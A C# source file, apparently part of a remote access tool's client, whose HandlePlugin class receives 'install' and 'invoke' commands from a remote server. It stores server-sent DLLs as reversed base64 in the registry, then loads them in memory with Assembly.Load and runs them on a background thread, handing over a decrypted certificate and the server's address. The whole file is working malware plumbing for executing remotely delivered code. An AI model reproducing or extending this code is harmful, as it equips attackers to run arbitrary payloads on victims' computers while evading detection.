using Client.Connection;
using Client.Helper;
using Client.MessagePack;
using Microsoft.VisualBasic;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;

namespace Client.Handle_Packet
{
    public class HandlePlugin
    {
        public HandlePlugin(MsgPack unpack_msgpack)
        {
            switch (unpack_msgpack.ForcePathObject("Command").AsString)
            {
                case "invoke":
                    {
                        string hash = unpack_msgpack.ForcePathObject("Hash").AsString;
                        if (RegistryDB.GetValue(hash) != null)
                        {
                            Debug.WriteLine("Found: " + hash);
                            Invoke(hash);
                        }
                        else
                        {
                            Debug.WriteLine("Not Found: " + hash);
                            Request(unpack_msgpack.ForcePathObject("Hash").AsString); ;
                        }
                        break;
                    }

                case "install":
                    {
                        string hash = unpack_msgpack.ForcePathObject("Hash").AsString;
                        RegistryDB.SetValue(hash, unpack_msgpack.ForcePathObject("Dll").AsString);
                        Invoke(hash);
                        Debug.WriteLine("Installed: " + hash);
                        break;
                    }
            }

        }

        public void Request(string hash)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "plugin";
            msgPack.ForcePathObject("Hash").AsString = hash;
            ClientSocket.Send(msgPack.Encode2Bytes());
        }

        public void Invoke(string hash)
        {
            new Thread(delegate ()
            {
                try
                {
                    MsgPack msgPack = new MsgPack();
#if DEBUG
                    msgPack.ForcePathObject("Certificate").AsString = Settings.Certificate;
#else
                    msgPack.ForcePathObject("Certificate").AsString = Settings.aes256.Decrypt(Settings.Certificate);
#endif
                    msgPack.ForcePathObject("Host").AsString = ClientSocket.TcpClient.RemoteEndPoint.ToString().Split(':')[0];
                    msgPack.ForcePathObject("Port").AsString = ClientSocket.TcpClient.RemoteEndPoint.ToString().Split(':')[1];

                    Assembly loader = Assembly.Load(Convert.FromBase64String(Strings.StrReverse(RegistryDB.GetValue(hash))));
                    MethodInfo meth = loader.GetType("Plugin.Plugin").GetMethod("Initialize");
                    Debug.WriteLine("Invoked");
                    meth.Invoke(null, new object[] { msgPack.Encode2Bytes() });
                }
                catch (Exception ex)
                {
                    Packet.Error(ex.Message);
                }
            })
            { IsBackground = true }.Start();
        }
    }
}
